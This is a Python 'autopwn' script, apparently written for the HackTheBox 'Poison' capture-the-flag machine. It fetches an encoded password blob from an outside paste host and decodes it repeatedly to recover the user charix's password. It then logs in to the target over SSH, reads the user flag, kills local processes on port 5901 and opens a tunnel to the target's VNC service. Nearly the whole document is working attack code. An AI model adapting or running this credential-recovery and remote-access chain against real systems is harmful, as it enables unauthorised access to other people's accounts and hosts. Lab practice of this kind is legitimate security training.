#Author:w33ge
#Twitter-> https://twitter.com/00xnc
#Autopwn Poison machine hackthebox
#!/usr/bin/python
import requests
import os
import base64
import time
import paramiko
from paramiko import SSHClient
import sys

mydir = str(os.getcwd())
req = requests.get('https://putsreq.com/MsYHVZj8MlTqdKbRKz5Y')
r = req.text
file3 = open('%s/pwdbackup' % mydir, 'w')
file3.write(r)
file3.close()

try:
    for i in range(13):
        if i == 0:
            arquivo = open('%s/pwdbackup' % mydir, 'r')
        else:                         
            arquivo = open("%s/flag%d.txt" % (mydir, i - 1), 'r') 
        file = arquivo.read()
        enc = base64.b64decode(bytes(file, "utf-8")).decode()
        other = open('flag%d.txt' % i, 'w')
        text = enc
        other.write(text)
        other.close()

        if "Charix" in text:
            print('\033[1;31mhash ===== > %s' % text)
        else:
            pass
except Exception as e:
    print ("code error", str(e))
time.sleep(2)
deletar = input("Do you want to delete the files with the previous flags? >>> [Y] for yes or [N] for no: ").lower()
if deletar == 'y':
    for n in range(12):
        patch = "%s/flag%d.txt" % (mydir, n) 
        os.remove(patch)
        time.sleep( 1 )
else:
    pass
secondp = open("%s/flag12.txt" % mydir, 'r')
mile = secondp.read()
secondp.close()      
time.sleep(3)
try:
	print('\033[1;32mloading ssh, please wait...')
	print('\033[1;32mconect status: loading')
	print('\033[1;32m======= >>>>> YOUR USER PASS <<<<< ======= ')
	class SSH:
	    def __init__(self):
	        self.ssh = SSHClient()
	        self.ssh.load_system_host_keys()
	        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	        self.ssh.connect(hostname='10.10.10.84',port= 22, username='charix',password= '%s' % mile)

	    def exec_cmd(self,cmd):
	        stdin,stdout,stderr = self.ssh.exec_command(cmd)
	        if stderr.channel.recv_exit_status() != 0:
	            print(stderr.read().decode('utf8').strip())
	        else:
	            print(stdout.read().decode('utf8').strip())
	if __name__ == '__main__':
	    ssh = SSH()
	    ssh.exec_cmd("cat user.txt")
	    ssh.exec_cmd("exit")
	    ssh.exec_cmd("exit")
	    print("tunneling...")
	    print("copy the hash[  %s  ]and paste here: " % mile)
	    time.sleep(1)
	    os.system('lsof -ti:5901 | xargs kill -9')
	    os.system('ssh -L 5901:127.0.0.1:5901 -N -f -l charix 10.10.10.84')
	    print("tunneling OK!")

except:

	print("[ssh connection failed]")
	print("[please, check your user/pass in the source code]")
